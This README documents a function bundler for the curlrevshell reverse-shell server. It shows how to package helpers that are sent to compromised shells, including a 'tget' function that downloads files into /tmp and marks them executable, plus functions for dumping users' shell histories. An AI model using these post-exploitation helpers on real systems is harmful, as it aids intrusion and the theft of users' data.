`-ctrl-i-file`/`-callback-template` Function Bundler
====================================================
Generates a generator which takes one or more directories of shell functions
and other (just perl, for now) scripts and rolls them into a file usable with
[`-callback-template`](../../doc/flags.md#-callback-template) and/or
[`-ctrl-i-file`](../../doc/flags.md#-ctrl-i-file).

Functions can take the form of shell scripts ending in `.sh` or `.subr` or 
Perl scripts ending in `.pl`.  Other languages may be added in the future.
Maybe.

A few shell functions are in the [`./functions`](./functions) directory.  These
are very likely to change.

Try `funcgen -h` for more info.

This all happened because the author got tired of typing `tr '\0' '\n'
</proc/pid/environ | sort -u` over and over.  And because running a Perl script
as a shell function is a neat party trick.

Quickstart
----------
1.  Make a directory and stick some shell functions in it.
    ```sh
    # Directory in which we'll stick our function files.
    mkdir ~/funcs
    
    # We'll make some handy shell functions: one to list processes, another to
    # download tools to /tmp, and a third to dump users' shell histories.
    cat >~/funcs/sf.sh <<'_eof'

    # psod (ps oh dear) lists processes in a nice tree
    # Usage: psod
    function psod { ps awwwfux; }

    # tget downloads a file into /tmp
    # Usage: tget url filename
    function tget {
            if [ -z "$1" ] || [ -z "$2" ]; then
                    echo "Usage: $0 url filename" >&2
                    return 1
            fi
            curl --silent --verbose --location --max-time 60 "$1" > "/tmp/$2" &&
                    chmod 0755 "/tmp/$2";
    }
    _eof

    # We'll also throw in a perl script which a knockoff of netstat -ant but
    # reads /proc/net/tcp itself.
    cat >~/funcs/pant.pl <<'_eof'
    #!/usr/bin/env perl
    # pant is a netstat -ant knockoff which reads /proc/net/tcp itself.
    # Usage: pant
    use strict;
    open my $H, "</proc/net/tcp" or die "Open: $!";
    sub pa {
            return join(".", reverse(map {unpack "C"}
                            split(//, pack("H*", shift)))) .
            ":" .
            unpack("S>", pack("H*", shift));
    }
    while (<$H>) {
            next unless /
                    ^\s+\d+:\s
                    ([0-9A-F]{8}):([0-9A-F]{4})\s
                    ([0-9A-F]{8}):([0-9A-F]{4})\s
                    ([0-9A-F]{2})\s 
                    /x;
            printf "%2s %21s %21s %s\n", $5, pa($1, $2), pa($3, $4);
    }
    _eof
    ```
2.  Make sure you have `funcgen` built and in the right place.  Be in the
    top of the repository (i.e. where
    [`curlrevshell.go`](../../../curlrevshell.go) lives) and
    ```sh
    make tools/funcgen
    ```
2.  Turn the files we just made into a callback template which sends the
    functions to the shell when it connects.
    ```sh
    ./tools/funcgen -o ~/callback.tmpl -t @builtin ~/funcs && ls -l ~/callback.tmpl
    ```
3.  Also turn them into a file sendable with Ctrl+I, for easier iteration.
    ```sh
    ./tools/funcgen -o ~/ctrl-i-file ~/funcs && ls -l ~/ctrl-i-file
    ```
4.  Start curlrevshell to use both files
    ```sh
    make install # If you've not already got it installed
    curlrevshell -ctrl-i-file ~/ctrl-i-file -callback-template ~/callback.tmpl
    ```
5.  Once a shell has connected, there should be a process listing, some other
    info, and the functions `psod`, `tget`, `histories`, and `pss` should
    work.

Quickerstart
------------
1.  Be in the top level of this repo.
    ```sh
    ls curlrevshell.go || echo "In wrong directory" >&2
    ```
2.  Make functiony files and start the server.
    ```sh
    # Make the server and tools
    make && make install
    # Generate files with default functions
    ./tools/funcgen -o ~/callback.tmpl -t @builtin ./tools/src/funcgen/functions
    ./tools/funcgen -o ~/ctrl-i-file               ./tools/src/funcgen/functions
    # Start the server
    curlrevshell -ctrl-i-file ~/ctrl-i-file -callback-template ~/callback.tmpl
    ```
3.  As needed, edit files in [`./tools/src/funcgen/functions`](./functions),
    adding or deleting more when expedient.  When you're ready to send the
    new functions to the shell:
    ```sh
    ./tools/funcgen -o ~/ctrl-i-file ./tools/src/funcgen/functions
    ```
    and Ctrl+I in the shell.  Don't forget to rebuild `~/callback.tmpl` before
    the next shell calls back.
